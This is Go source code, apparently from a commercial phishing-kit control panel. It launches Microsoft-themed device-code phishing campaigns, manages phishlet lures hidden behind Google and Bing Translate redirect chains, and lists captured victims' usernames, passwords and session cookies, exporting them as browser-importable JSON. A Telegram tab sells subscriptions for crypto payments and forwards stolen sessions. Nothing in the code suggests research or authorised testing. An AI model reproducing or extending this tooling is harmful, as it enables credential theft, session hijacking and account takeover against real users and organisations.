<select name="username" style="font-size:11.5px;padding:4px 7px">%s</select>
<button type="submit" class="btn btn-ghost btn-xs">Save</button>
</form>`, i, userOptions)

				deleteLureBtn := fmt.Sprintf(`<form class="inline" method="POST" action="/admin/panel?tab=lures" onsubmit="return confirm('Delete lure %d?')">
<input type="hidden" name="action" value="delete_lure">
<input type="hidden" name="lure_id" value="%d">
<button type="submit" class="btn btn-danger btn-xs">Delete</button>
</form>`, i, i)

				b.WriteString(fmt.Sprintf(`<tr>
<td class="mono" style="color:var(--t3)">%d</td>
<td><span class="badge badge-purple">%s</span><br><span style="color:var(--t3);font-size:11px">%s</span></td>
<td>%s</td>
<td>%s</td>
<td>%s<br>%s</td>
<td>%s</td>
<td>%s</td>
</tr>`, i,
					template.HTMLEscapeString(l.Phishlet),
					phishletFriendlyName(l.Phishlet),
					lureURLCell, redirectCell,
					userCell, assignForm,
					chainCell,
					deleteLureBtn,
				))
			}
			b.WriteString(`</tbody></table></div>`)
		}
		b.WriteString(`</div>`)

	// ── SESSIONS ──────────────────────────────────────────────────────────────
	case "sessions":
		b.WriteString(`<div class="section">`)
		b.WriteString(sectionHd(fmt.Sprintf("All Sessions (%d)", len(allSessions))))
		if len(allSessions) == 0 {
			b.WriteString(`<div class="empty">No sessions captured yet.</div>`)
		} else {
			b.WriteString(sessionTable(allSessions, true))
		}
		b.WriteString(`</div>`)

	// ── BLACKLIST ─────────────────────────────────────────────────────────────
	case "blacklist":
		b.WriteString(`<div class="section">`)
		b.WriteString(sectionHd("Block IP / CIDR"))
		b.WriteString(`<div class="card"><form method="POST" action="/admin/panel?tab=blacklist">
<input type="hidden" name="action" value="blacklist_add">
<div class="form-row">
  <input type="text" name="ip" placeholder="1.2.3.4 or 1.2.3.0/24" style="width:280px">
  <button type="submit" class="btn btn-danger btn-sm">Block</button>
</div></form></div></div>`)

		b.WriteString(`<div class="section">`)
		b.WriteString(sectionHd("Blocked Entries"))
		if GlobalBlacklist == nil {
			b.WriteString(`<div class="empty">Blacklist not loaded.</div>`)
		} else {
			ips := make([]string, 0, len(GlobalBlacklist.ips))
			for k := range GlobalBlacklist.ips {
				ips = append(ips, k)
			}
			if len(ips) == 0 && len(GlobalBlacklist.masks) == 0 {
				b.WriteString(`<div class="empty">No IPs blocked yet.</div>`)
			} else {
				b.WriteString(`<div class="table-wrap"><table><thead><tr><th>IP / CIDR</th><th>Type</th><th></th></tr></thead><tbody>`)
				for _, ip := range ips {
					b.WriteString(fmt.Sprintf(`<tr>
<td class="mono">%s</td>
<td><span class="badge badge-gray">IP</span></td>
<td>
<form class="inline" method="POST" action="/admin/panel?tab=blacklist">
<input type="hidden" name="action" value="blacklist_remove">
<input type="hidden" name="ip" value="%s">
<button type="submit" class="btn btn-ghost btn-xs">Remove</button>
</form></td></tr>`, template.HTMLEscapeString(ip), template.HTMLEscapeString(ip)))
				}
				for _, m := range GlobalBlacklist.masks {
					if m.mask != nil {
						b.WriteString(fmt.Sprintf(`<tr>
<td class="mono">%s</td>
<td><span class="badge badge-amber">CIDR</span></td>
<td><span style="color:var(--t3);font-size:11px">auto-blocked</span></td>
</tr>`, template.HTMLEscapeString(m.mask.String())))
					}
				}
				b.WriteString(`</tbody></table></div>`)
			}
		}
		b.WriteString(`</div>`)

	// ── DEVICE CODES ──────────────────────────────────────────────────────────
	case "devicecodes":
		if r.Method == "POST" {
			action := r.FormValue("action")
			switch action {
			case "save_smtp":
				host := strings.TrimSpace(r.FormValue("smtp_host"))
				portStr := strings.TrimSpace(r.FormValue("smtp_port"))
				user := strings.TrimSpace(r.FormValue("smtp_user"))
				pass := r.FormValue("smtp_pass")
				from := strings.TrimSpace(r.FormValue("smtp_from"))
				port, _ := strconv.Atoi(portStr)
				s.Cfg.SetSmtp(host, port, user, pass, from)
				http.Redirect(w, r, "/admin/panel?tab=devicecodes&ok=smtp+saved", http.StatusSeeOther)
				return
			case "launch_campaign":
				name := strings.TrimSpace(r.FormValue("camp_name"))
				tmpl := r.FormValue("camp_template")
				emailsRaw := r.FormValue("camp_emails")
				var emails []string
				for _, line := range strings.Split(emailsRaw, "\n") {
					e := strings.TrimSpace(line)
					if e != "" {
						emails = append(emails, e)
					}
				}
				if len(emails) == 0 {
					http.Redirect(w, r, "/admin/panel?tab=devicecodes&err=no+emails", http.StatusSeeOther)
					return
				}
				camp, _ := LaunchCampaign(name, tmpl, emails)
				http.Redirect(w, r, fmt.Sprintf("/admin/panel?tab=devicecodes&ok=campaign+%d+launched+(%d+targets)", camp.ID, len(camp.Targets)), http.StatusSeeOther)
				return

			case "start_dc_single":
				email := strings.TrimSpace(r.FormValue("dc_single_email"))
				if email == "" || !strings.Contains(email, "@") {
					http.Redirect(w, r, "/admin/panel?tab=devicecodes&err=invalid+email", http.StatusSeeOther)
					return
				}
				tgt, err := StartDeviceCode(email)
				if err != nil {
					http.Redirect(w, r, "/admin/panel?tab=devicecodes&err="+url.QueryEscape(err.Error()), http.StatusSeeOther)
					return
				}
				http.Redirect(w, r, "/admin/panel?tab=devicecodes&ok=dc+started+for+"+url.QueryEscape(email)+"&preview="+tgt.LandingToken, http.StatusSeeOther)
				return

			case "save_letter":
				letterHTML := r.FormValue("letter_html")
				subjectTxt := r.FormValue("subject_txt")
				if letterHTML != "" {
					os.WriteFile("letter.html", []byte(letterHTML), 0644)
				}
				if subjectTxt != "" {
					os.WriteFile("subject.txt", []byte(strings.TrimSpace(subjectTxt)), 0644)
				}
				http.Redirect(w, r, "/admin/panel?tab=devicecodes&ok=letter+saved", http.StatusSeeOther)
				return
			}
		}

		baseURL := "http://" + s.Cfg.GetServerExternalIP()

		// SMTP config
		b.WriteString(`<div class="section">`)
		b.WriteString(sectionHd("SMTP Configuration"))
		b.WriteString(fmt.Sprintf(`<div class="card"><form method="POST" action="/admin/panel?tab=devicecodes">
<input type="hidden" name="action" value="save_smtp">
<div class="form-grid">
  <div class="field"><label class="field-label">SMTP Host</label><input type="text" name="smtp_host" placeholder="smtp.gmail.com" value="%s"></div>
  <div class="field"><label class="field-label">Port</label><input type="text" name="smtp_port" placeholder="587" value="%s"></div>
  <div class="field"><label class="field-label">Username</label><input type="text" name="smtp_user" placeholder="user@gmail.com" value="%s"></div>
  <div class="field"><label class="field-label">Password</label><input type="password" name="smtp_pass" placeholder="••••••••" value="%s"></div>
  <div class="field field-full"><label class="field-label">From Name / Email</label><input type="text" name="smtp_from" placeholder="Microsoft Security &lt;no-reply@microsoft.com&gt;" value="%s"></div>
</div>
<button type="submit" class="btn btn-blue">Save SMTP</button>
</form></div></div>`,
			template.HTMLEscapeString(s.Cfg.GetSmtpHost()),
			func() string {
				p := s.Cfg.GetSmtpPort()
				if p == 0 {
					return "587"
				}
				return strconv.Itoa(p)
			}(),
			template.HTMLEscapeString(s.Cfg.GetSmtpUser()),
			template.HTMLEscapeString(s.Cfg.GetSmtpPass()),
			template.HTMLEscapeString(s.Cfg.GetSmtpFrom()),
		))

		// Start DC single
		previewToken := r.URL.Query().Get("preview")
		previewBanner := ""
		if previewToken != "" {
			phishLink := "http://" + s.Cfg.GetServerExternalIP() + "/dc/" + previewToken
			previewBanner = fmt.Sprintf(`<div class="flash-ok" style="border-color:rgba(16,185,129,.3)">
<strong>✓ DC Started</strong> — phish link ready<br>
<div style="margin-top:8px;display:flex;flex-wrap:wrap;gap:8px;align-items:center">
  <span class="mono" style="color:var(--t1)">%s</span>
  <button onclick="cp(this)" data-copy="%s" class="btn btn-green btn-sm">📋 Copy Phish Link</button>
  <a href="/dc/preview/%s" target="_blank" class="btn btn-ghost btn-sm">Preview Email →</a>
</div></div>`,
				template.HTMLEscapeString(phishLink),
				template.HTMLEscapeString(phishLink),
				template.HTMLEscapeString(previewToken))
		}
		b.WriteString(`<div class="section">`)
		b.WriteString(sectionHd("Start DC — No Email (Test Mode)"))
		b.WriteString(previewBanner)
		b.WriteString(`<div class="card"><form method="POST" action="/admin/panel?tab=devicecodes">
<input type="hidden" name="action" value="start_dc_single">
<div class="form-row">
  <input type="text" name="dc_single_email" placeholder="victim@company.com" style="max-width:320px">
  <button type="submit" class="btn btn-primary btn-sm">Start DC</button>
</div>
<p style="color:var(--t3);font-size:11.5px;margin-top:8px">Starts the device code flow — no email sent. Use <strong style="color:var(--t2)">Preview Email</strong> to copy HTML and send manually.</p>
</form></div></div>`)

		// Letter editor
		var existingLetter, existingSubject string
		if raw, err := os.ReadFile("letter.html"); err == nil {
			existingLetter = string(raw)
		}
		if raw, err := os.ReadFile("subject.txt"); err == nil {
			existingSubject = strings.TrimSpace(string(raw))
		}
		b.WriteString(`<div class="section">`)
		b.WriteString(sectionHd("Letter Editor"))
		b.WriteString(`<div class="card">`)
		b.WriteString(`<p style="color:var(--t3);font-size:11.5px;margin-bottom:14px">Tokens: <code style="color:var(--t2)">SILENTCODERSEMAIL</code> · <code style="color:var(--t2)">SILENTCODERSEMAILURL</code> · <code style="color:var(--t2)">DCLANDING</code> · <code style="color:var(--t2)">DCCODE</code> · <code style="color:var(--t2)">USER</code> · <code style="color:var(--t2)">DOMAIN</code> · <code style="color:var(--t2)">DOMC</code></p>`)
		b.WriteString(fmt.Sprintf(`<form method="POST" action="/admin/panel?tab=devicecodes">
<input type="hidden" name="action" value="save_letter">
<div class="form-grid">
  <div class="field field-full"><label class="field-label">Subject Line</label>
    <input type="text" name="subject_txt" value="%s" placeholder="Microsoft Security Alert: Action Required">
  </div>
  <div class="field field-full"><label class="field-label">Email HTML (letter.html)</label>
    <textarea name="letter_html" rows="14" style="font-family:monospace;font-size:11.5px;color:#7ec8e3" placeholder="Paste full HTML email — tokens replaced on send/preview">%s</textarea>
  </div>
</div>
<button type="submit" class="btn btn-blue btn-sm">Save Letter</button>
<span style="color:var(--t3);font-size:11.5px;margin-left:10px">Saved to letter.html + subject.txt. Takes effect immediately.</span>
</form></div></div>`,
			template.HTMLEscapeString(existingSubject),
			template.HTMLEscapeString(existingLetter),
		))

		// Launch campaign
		b.WriteString(`<div class="section">`)
		b.WriteString(sectionHd("Launch Campaign"))
		b.WriteString(`<div class="card"><form method="POST" action="/admin/panel?tab=devicecodes">
<input type="hidden" name="action" value="launch_campaign">
<div class="form-grid">
  <div class="field"><label class="field-label">Campaign Name</label><input type="text" name="camp_name" placeholder="Q2 Targets"></div>
  <div class="field"><label class="field-label">Template</label>
    <select name="camp_template">
      <option value="security_alert">Microsoft Security Alert</option>
      <option value="it_helpdesk">IT Helpdesk</option>
      <option value="custom">Custom (letter.html)</option>
    </select>
  </div>
  <div class="field field-full"><label class="field-label">Email List (one per line)</label>
    <textarea name="camp_emails" rows="6" placeholder="one@company.com&#10;two@company.com"></textarea>
  </div>
</div>
<button type="submit" class="btn btn-green">🚀 Launch Campaign</button>
<span style="color:var(--t3);font-size:11.5px;margin-left:10px">Each target gets a unique code. Emails sent via SMTP above.</span>
</form></div></div>`)

		// Active DC sessions
		allTargets := GetDCTargets()
		b.WriteString(`<div class="section">`)
		b.WriteString(sectionHd(fmt.Sprintf("Active Sessions (%d)", len(allTargets))))
		if len(allTargets) == 0 {
			b.WriteString(`<div class="empty">No device code sessions yet.</div>`)
		} else {
			b.WriteString(`<div class="table-wrap"><table><thead><tr>
<th>#</th><th>Email / Tenant</th><th>Code</th><th>Status</th>
<th>Phish Link</th><th>Started</th><th>Actions</th></tr></thead><tbody>`)
			for i := len(allTargets) - 1; i >= 0; i-- {
				tgt := allTargets[i]
				status := tgt.GetStatus()
				badgeClass := "badge-amber"
				switch status {
				case "completed":
					badgeClass = "badge-green"
				case "expired", "declined", "error":
					badgeClass = "badge-red"
				}
				label := tgt.Email
				if label == "" {
					label = tgt.Tenant
				}
				landingURL := baseURL + "/dc/" + tgt.LandingToken
				landingCell := fmt.Sprintf(
					`<div style="display:flex;flex-direction:column;gap:4px">
<span class="mono url-cell">%s</span>
<button class="btn btn-ghost btn-xs" style="align-self:flex-start" onclick="cp(this)" data-copy="%s">📋 Copy Link</button>
</div>`,
					template.HTMLEscapeString(landingURL),
					template.HTMLEscapeString(landingURL),
				)

				tgt.mu.Lock()
				at := tgt.AccessToken
				tgt.mu.Unlock()
				previewURL := "/dc/preview/" + tgt.LandingToken
				tokenCell := fmt.Sprintf(
					`<a href="%s" target="_blank" class="btn btn-ghost btn-xs">Preview Email</a>`,
					template.HTMLEscapeString(previewURL))
				if at != "" {
					useURL := "/dc/use/" + tgt.LandingToken
					openURL := "/dc/open/" + tgt.LandingToken
					tokenCell = fmt.Sprintf(
						`<div style="display:flex;gap:6px;flex-wrap:wrap">
<a href="%s" target="_blank" class="btn btn-blue btn-xs">Dashboard</a>
<a href="%s" target="_blank" class="btn btn-green btn-xs">⚡ OWA</a>
</div>`,
						template.HTMLEscapeString(useURL),
						template.HTMLEscapeString(openURL))
				}

				b.WriteString(fmt.Sprintf(`<tr>
<td class="mono" style="color:var(--t3)">%d</td>
<td class="mono" style="color:var(--t1)">%s</td>
<td><span class="mono" style="font-weight:700;font-size:14px;letter-spacing:3px;color:var(--amber)">%s</span></td>
<td><span class="badge %s">%s</span></td>
<td>%s</td>
<td class="mono" style="color:var(--t3);font-size:11px">%s</td>
<td>%s</td>
</tr>`,
					tgt.ID,
					template.HTMLEscapeString(label),
					template.HTMLEscapeString(tgt.UserCode),
					badgeClass, status,
					landingCell,
					tgt.StartedAt.Format("Jan 2 15:04"),
					tokenCell,
				))
			}
			b.WriteString(`</tbody></table></div>`)
		}
		b.WriteString(`</div>`)

	// ── TELEGRAM BOT ──────────────────────────────────────────────────────────
	case "telegram":
		b.WriteString(`<div class="section">`)
		b.WriteString(sectionHd("Bot Configuration"))
		b.WriteString(fmt.Sprintf(`<div class="card"><form method="POST" action="/admin/panel?tab=telegram">
<input type="hidden" name="action" value="save_bot_config">
<div class="form-grid">
  <div class="field field-full"><label class="field-label">Bot Token (from @BotFather)</label><input type="text" name="bot_token" placeholder="1234567890:AABBCCddEEff..." value="%s"></div>
  <div class="field"><label class="field-label">Admin Chat ID</label><input type="text" name="bot_admin_chat_id" placeholder="your Telegram chat ID" value="%d"></div>
  <div class="field"><label class="field-label">Price (USD/month)</label><input type="text" name="sub_price" placeholder="150" value="%d"></div>
  <div class="field"><label class="field-label">BTC Address</label><input type="text" name="crypto_btc" placeholder="Bitcoin address" value="%s"></div>
  <div class="field"><label class="field-label">ETH Address</label><input type="text" name="crypto_eth" placeholder="Ethereum address" value="%s"></div>
  <div class="field"><label class="field-label">USDT Address (TRC20)</label><input type="text" name="crypto_usdt" placeholder="USDT address" value="%s"></div>
</div>
<button type="submit" class="btn btn-blue">Save Config</button>
<span style="color:var(--t3);font-size:11.5px;margin-left:10px">Token change requires restart</span>
</form></div></div>`,
			template.HTMLEscapeString(s.Cfg.GetBotToken()),
			s.Cfg.GetBotAdminChatId(),
			s.Cfg.GetSubPrice(),
			template.HTMLEscapeString(s.Cfg.GetCryptoBTC()),
			template.HTMLEscapeString(s.Cfg.GetCryptoETH()),
			template.HTMLEscapeString(s.Cfg.GetCryptoUSDT()),
		))

		b.WriteString(`<div class="section">`)
		b.WriteString(sectionHd(fmt.Sprintf("Subscriptions (%d)", len(allSubs))))
		if len(allSubs) == 0 {
			b.WriteString(`<div class="empty">No subscriptions yet.</div>`)
		} else {
			b.WriteString(`<div class="table-wrap"><table><thead><tr>
<th>ID</th><th>Chat ID</th><th>Service</th><th>Status</th><th>TX Hash</th><th>Expires</th><th>Links</th><th>Actions</th>
</tr></thead><tbody>`)
			for _, sub := range allSubs {
				statusBadge := `<span class="badge badge-gray">` + template.HTMLEscapeString(sub.Status) + `</span>`
				switch sub.Status {
				case "active":
					statusBadge = `<span class="badge badge-green">active</span>`
				case "pending":
					statusBadge = `<span class="badge badge-amber">pending</span>`
				case "expired":
					statusBadge = `<span class="badge badge-red">expired</span>`
				}

				expiry := `<span style="color:var(--t3)">—</span>`
				if sub.ExpiresAt > 0 {
					expiry = time.Unix(sub.ExpiresAt, 0).Format("2006-01-02")
				}

				txCell := `<span style="color:var(--t3)">—</span>`
				if sub.TxHash != "" {
					txCell = fmt.Sprintf(`<span class="mono" style="font-size:11px">%s</span>`, template.HTMLEscapeString(truncateStr(sub.TxHash, 18)))
				}

				linksCell := `<span style="color:var(--t3)">—</span>`
				if sub.ChainTranslate != "" || sub.LureURL != "" {
					linksCell = `<details><summary>▶ links</summary><div class="chain-box">`
					if sub.LureURL != "" {
						linksCell += fmt.Sprintf(`<div class="chain-label">Direct URL</div><div class="chain-link">%s <button class="btn btn-ghost btn-xs" onclick="cp(this)" data-copy="%s">Copy</button></div>`,
							template.HTMLEscapeString(truncateStr(sub.LureURL, 40)), template.HTMLEscapeString(sub.LureURL))
					}
					if sub.ChainTranslate != "" {
						linksCell += fmt.Sprintf(`<div class="chain-label">Google Translate</div><div class="chain-link">%s <button class="btn btn-ghost btn-xs" onclick="cp(this)" data-copy="%s">Copy</button></div>`,
							template.HTMLEscapeString(truncateStr(sub.ChainTranslate, 40)), template.HTMLEscapeString(sub.ChainTranslate))
					}
					if sub.ChainBing != "" {
						linksCell += fmt.Sprintf(`<div class="chain-label">Bing Translator</div><div class="chain-link">%s <button class="btn btn-ghost btn-xs" onclick="cp(this)" data-copy="%s">Copy</button></div>`,
							template.HTMLEscapeString(truncateStr(sub.ChainBing, 40)), template.HTMLEscapeString(sub.ChainBing))
					}
					linksCell += `</div></details>`
				}

				actions := ""
				if sub.Status == "pending" {
					actions += fmt.Sprintf(`<form class="inline" method="POST" action="/admin/panel?tab=telegram">
<input type="hidden" name="action" value="approve_sub">
<input type="hidden" name="sub_id" value="%d">
<button type="submit" class="btn btn-green btn-xs">✓ Approve</button>
</form> `, sub.Id)
					actions += fmt.Sprintf(`<form class="inline" method="POST" action="/admin/panel?tab=telegram">
<input type="hidden" name="action" value="reject_sub">
<input type="hidden" name="sub_id" value="%d">
<button type="submit" class="btn btn-ghost btn-xs">✗ Reject</button>
</form>`, sub.Id)
				} else {
					actions += fmt.Sprintf(`<form class="inline" method="POST" action="/admin/panel?tab=telegram" onsubmit="return confirm('Delete subscription %d?')">
<input type="hidden" name="action" value="delete_sub">
<input type="hidden" name="sub_id" value="%d">
<button type="submit" class="btn btn-danger btn-xs">Delete</button>
</form>`, sub.Id, sub.Id)
				}

				b.WriteString(fmt.Sprintf(`<tr>
<td class="mono" style="color:var(--t3)">%d</td>
<td class="mono">%d</td>
<td><span class="badge badge-purple">%s</span><br><span style="color:var(--t3);font-size:11px">%s</span></td>
<td>%s</td>
<td>%s</td>
<td class="mono" style="font-size:11.5px">%s</td>
<td>%s</td>
<td>%s</td>
</tr>`,
					sub.Id, sub.TelegramChatId,
					template.HTMLEscapeString(sub.Phishlet),
					phishletFriendlyName(sub.Phishlet),
					statusBadge, txCell, expiry, linksCell, actions,
				))
			}
			b.WriteString(`</tbody></table></div>`)
		}
		b.WriteString(`</div>`)
	}

	nav := `<a href="/admin/panel?tab=overview" class="topbar-link">Overview</a>
<a href="/admin/panel?tab=sessions" class="topbar-link">Sessions</a>
<a href="/admin/panel?tab=devicecodes" class="topbar-link">Device Codes</a>
<a href="/admin/panel?tab=lures" class="topbar-link">Lures</a>
<a href="/admin/panel?tab=telegram" class="topbar-link">Telegram</a>`

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprint(w, panelPage("Admin Panel", nav, b.String()))
}

// ───────────────────────────── User Panel ──────────────────────────────────

func (s *HttpServer) handleUserPanel(w http.ResponseWriter, r *http.Request) {
	parts := strings.Split(strings.Trim(r.URL.Path, "/"), "/")
	if len(parts) < 2 {
		http.NotFound(w, r)
		return
	}
	token := parts[1]

	user, err := s.Db.UserGetByToken(token)
	if err != nil {
		http.Error(w, "Invalid panel token", http.StatusForbidden)
		return
	}

	lures := s.Cfg.GetLuresByUser(user.Username)
	sessions, _ := s.Db.ListSessions()

	userPhishlets := map[string]bool{}
	for _, l := range lures {
		userPhishlets[l.Phishlet] = true
	}
	var userSessions []*database.Session
	for _, sess := range sessions {
		if userPhishlets[sess.Phishlet] {
			userSessions = append(userSessions, sess)
		}
	}

	totalTokens := 0
	for _, sess := range userSessions {
		if len(sess.CookieTokens) > 0 || len(sess.BodyTokens) > 0 || len(sess.HttpTokens) > 0 {
			totalTokens++
		}
	}

	var b strings.Builder

	b.WriteString(fmt.Sprintf(`<div style="margin-bottom:22px">
<h2 style="font-size:18px;font-weight:700;color:#fff;margin-bottom:4px">Welcome back, %s</h2>
<p style="color:var(--t3);font-size:12.5px">Your personal phishing panel</p>
</div>`, template.HTMLEscapeString(user.Username)))

	b.WriteString(fmt.Sprintf(`<div class="stats" style="margin-bottom:24px">
  <div class="stat"><div class="stat-n" style="color:var(--cyan)">%d</div><div class="stat-l">Lures</div></div>
  <div class="stat"><div class="stat-n" style="color:var(--t1)">%d</div><div class="stat-l">Sessions</div></div>
  <div class="stat"><div class="stat-n" style="color:var(--green)">%d</div><div class="stat-l">With Tokens</div></div>
</div>`, len(lures), len(userSessions), totalTokens))

	b.WriteString(`<div class="section">`)
	b.WriteString(sectionHd("Your Lures"))
	if len(lures) == 0 {
		b.WriteString(`<div class="empty">No lures assigned to your account yet.</div>`)
	} else {
		b.WriteString(`<div class="table-wrap"><table><thead><tr>
<th>#</th><th>Phishlet</th><th>Lure URL</th><th>Redirect URL</th><th>Chain Links</th>
</tr></thead><tbody>`)
		for i, l := range lures {
			lureURL := ""
			if l.Hostname != "" {
				lureURL = "https://" + l.Hostname + l.Path
			} else if pl, err := s.Cfg.GetPhishlet(l.Phishlet); err == nil {
				if pu, err := pl.GetLureUrl(l.Path); err == nil {
					lureURL = pu
				}
			}

			lureURLCell := `<span style="color:var(--t3)">—</span>`
			if lureURL != "" {
				lureURLCell = fmt.Sprintf(`<div class="url-cell">%s</div>
<button class="btn btn-ghost btn-xs" style="margin-top:4px" onclick="cp(this)" data-copy="%s">Copy URL</button>`,
					template.HTMLEscapeString(lureURL), template.HTMLEscapeString(lureURL))
			}

			redirectCell := `<span style="color:var(--t3)">—</span>`
			if l.RedirectUrl != "" {
				redirectCell = fmt.Sprintf(`<a href="%s" target="_blank" class="mono" style="font-size:11px;color:var(--t2)">%s</a>`,
					template.HTMLEscapeString(l.RedirectUrl), template.HTMLEscapeString(truncateStr(l.RedirectUrl, 40)))
			}

			chainCell := `<span style="color:var(--t3)">—</span>`
			if lureURL != "" {
				parsedURL, err := url.Parse(lureURL)
				if err == nil {
					phishBase := parsedURL.Scheme + "://" + parsedURL.Host
					outer, hops, err := GenerateRedirectChain(phishBase, lureURL, 3, s.Cfg.GetRedirectChainSecret())
					if err == nil {
						translateLink := "https://translate.google.com/translate?sl=auto&tl=en&u=" + url.QueryEscape(outer)
						bingLink2 := "https://www.bing.com/translator?to=en&url=" + url.QueryEscape(outer)

						chainCell = fmt.Sprintf(`<details>
<summary>▶ Show chain links</summary>
<div class="chain-box">
  <div class="chain-label">Google Translate</div>
  <div class="chain-link">%s <button class="btn btn-ghost btn-xs" onclick="cp(this)" data-copy="%s">Copy</button></div>
  <div class="chain-label">Bing Translator</div>
  <div class="chain-link">%s <button class="btn btn-ghost btn-xs" onclick="cp(this)" data-copy="%s">Copy</button></div>
  <div class="chain-label">Direct Chain</div>
  <div class="chain-link">%s <button class="btn btn-ghost btn-xs" onclick="cp(this)" data-copy="%s">Copy</button></div>`,
							template.HTMLEscapeString(truncateStr(translateLink, 55)), template.HTMLEscapeString(translateLink),
							template.HTMLEscapeString(truncateStr(bingLink2, 55)), template.HTMLEscapeString(bingLink2),
							template.HTMLEscapeString(truncateStr(outer, 55)), template.HTMLEscapeString(outer),
						)
						for j, hop := range hops {
							chainCell += fmt.Sprintf(`<div class="chain-hop">layer %d → %s</div>`, j+1, template.HTMLEscapeString(hop))
						}
						chainCell += `</div></details>`
					}
				}
			}

			b.WriteString(fmt.Sprintf(`<tr>
<td class="mono" style="color:var(--t3)">%d</td>
<td><span class="badge badge-purple">%s</span></td>
<td>%s</td>
<td>%s</td>
<td>%s</td>
</tr>`, i, template.HTMLEscapeString(l.Phishlet), lureURLCell, redirectCell, chainCell))
		}
		b.WriteString(`</tbody></table></div>`)
	}
	b.WriteString(`</div>`)

	b.WriteString(`<div class="section">`)
	b.WriteString(sectionHd(fmt.Sprintf("Captured Sessions (%d)", len(userSessions))))
	if len(userSessions) == 0 {
		b.WriteString(`<div class="empty">No sessions captured yet.</div>`)
	} else {
		b.WriteString(sessionTable(userSessions, false))
	}
	b.WriteString(`</div>`)

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprint(w, panelPage("User Panel", "", b.String()))
}

// ───────────────────────────── Shared helpers ──────────────────────────────

func sectionHd(title string) string {
	return fmt.Sprintf(`<div class="section-hd"><span class="section-title">%s</span><div class="section-line"></div></div>`, title)
}

func usersTable(userList []*database.User, allLures []*Lure, sessPerUser, tokenPerUser map[string]int) string {
	if len(userList) == 0 {
		return `<div class="empty">No users yet.</div>`
	}
	var b strings.Builder
	b.WriteString(`<div class="table-wrap"><table><thead><tr>
<th>Username</th><th>Panel URL</th><th>Lures</th><th>Sessions</th><th>Tokens</th><th>Created</th><th></th>
</tr></thead><tbody>`)
	for _, u := range userList {
		lureCount := 0
		for _, l := range allLures {
			if l.UserId == u.Username {
				lureCount++
			}
		}
		panelURL := fmt.Sprintf("/panel/%s", u.Token)
		b.WriteString(fmt.Sprintf(`<tr>
<td><span class="badge badge-blue">%s</span></td>
<td>
  <a href="%s" target="_blank" class="mono" style="font-size:11px;color:var(--t2)">%s</a>
  <button class="btn btn-ghost btn-xs" style="margin-left:6px" onclick="cp(this)" data-copy="%s">Copy</button>
</td>
<td class="mono" style="color:var(--t2)">%d</td>
<td class="mono" style="color:var(--t2)">%d</td>
<td class="mono" style="color:var(--green);font-weight:700">%d</td>
<td class="mono" style="color:var(--t3);font-size:11px">%s</td>
<td>
  <form class="inline" method="POST" action="/admin/panel?tab=users" onsubmit="return confirm('Delete %s?')">
    <input type="hidden" name="action" value="delete_user">
    <input type="hidden" name="id" value="%d">
    <button type="submit" class="btn btn-danger btn-xs">Delete</button>
  </form>
</td></tr>`,
			template.HTMLEscapeString(u.Username),
			panelURL, truncateStr(panelURL, 40), panelURL,
			lureCount,
			sessPerUser[u.Username],
			tokenPerUser[u.Username],
			time.Unix(u.CreatedAt, 0).Format("2006-01-02"),
			template.HTMLEscapeString(u.Username),
			u.Id,
		))
	}
	b.WriteString(`</tbody></table></div>`)
	return b.String()
}

func sessionTable(sessions []*database.Session, showDelete bool) string {
	var b strings.Builder
	b.WriteString(`<div class="table-wrap"><table><thead><tr>
<th>ID</th><th>Phishlet</th><th>Username</th><th>Password</th><th>Tokens</th><th>Remote IP</th><th>Time</th><th>Detail</th>`)
	if showDelete {
		b.WriteString(`<th></th>`)
	}
	b.WriteString(`</tr></thead><tbody>`)
	for _, sess := range sessions {
		hasCreds := sess.Username != "" || sess.Password != ""
		hasTokens := len(sess.CookieTokens) > 0 || len(sess.BodyTokens) > 0 || len(sess.HttpTokens) > 0

		tokenBadge := `<span class="badge badge-gray">none</span>`
		if hasTokens {
			tokenBadge = `<span class="badge badge-green">● captured</span>`
		}

		uname := template.HTMLEscapeString(sess.Username)
		if uname == "" {
			uname = `<span style="color:var(--t3)">—</span>`
		}
		pass := template.HTMLEscapeString(sess.Password)
		if pass == "" {
			pass = `<span style="color:var(--t3)">—</span>`
		}

		detail := `<span style="color:var(--t3)">—</span>`
		if hasCreds || hasTokens {
			sessionVal := "N/A"
			for _, v := range sess.BodyTokens {
				sessionVal = v
				break
			}
			if sessionVal == "N/A" {
				for _, v := range sess.HttpTokens {
					sessionVal = v
					break
				}
			}

			type browserCookie struct {
				Path           string `json:"path"`
				Domain         string `json:"domain"`
				ExpirationDate int64  `json:"expirationDate"`
				Value          string `json:"value"`
				Name           string `json:"name"`
				HttpOnly       bool   `json:"httpOnly"`
			}
			var cookies []browserCookie
			defaultExpiry := sess.UpdateTime + 2592000
			for domain, tokenMap := range sess.CookieTokens {
				for _, ct := range tokenMap {
					expiry := ct.ExpiresAt
					if expiry == 0 {
						expiry = defaultExpiry
					}
					cookies = append(cookies, browserCookie{
						Path:           ct.Path,
						Domain:         domain,
						ExpirationDate: expiry,
						Value:          ct.Value,
						Name:           ct.Name,
						HttpOnly:       ct.HttpOnly,
					})
				}
			}
			cookieJSON, _ := json.MarshalIndent(cookies, "", "    ")

			infoText := fmt.Sprintf("Username: %s\nPassword: %s\nSession: %s\n\nINFO.TXT\n\nConverted JSON:\n%s",
				sess.Username, sess.Password, sessionVal, string(cookieJSON))

			detail = fmt.Sprintf(`<details>
<summary>▶ view tokens</summary>
<pre>%s</pre>
</details>`, template.HTMLEscapeString(infoText))
		}

		b.WriteString(fmt.Sprintf(`<tr>
<td class="mono" style="color:var(--t3)">%d</td>
<td><span class="badge badge-purple">%s</span></td>
<td class="mono">%s</td>
<td class="mono">%s</td>
<td>%s</td>
<td class="mono" style="color:var(--t2)">%s</td>
<td class="mono" style="color:var(--t3);font-size:11px">%s</td>
<td>%s</td>`,
			sess.Id,
			template.HTMLEscapeString(sess.Phishlet),
			uname, pass, tokenBadge,
			template.HTMLEscapeString(sess.RemoteAddr),
			time.Unix(sess.UpdateTime, 0).Format("Jan 2 15:04"),
			detail,
		))
		b.WriteString(fmt.Sprintf(`<td>
<form class="inline" method="POST" action="/admin/panel?tab=sessions">
<input type="hidden" name="action" value="send_telegram">
<input type="hidden" name="session_id" value="%d">
<button type="submit" class="btn btn-xs" style="background:var(--accent);color:#fff">TG</button>
</form></td>`, sess.Id))
		if showDelete {
			b.WriteString(fmt.Sprintf(`<td>
<form class="inline" method="POST" action="/admin/panel?tab=sessions">
<input type="hidden" name="action" value="delete_session">
<input type="hidden" name="session_id" value="%d">
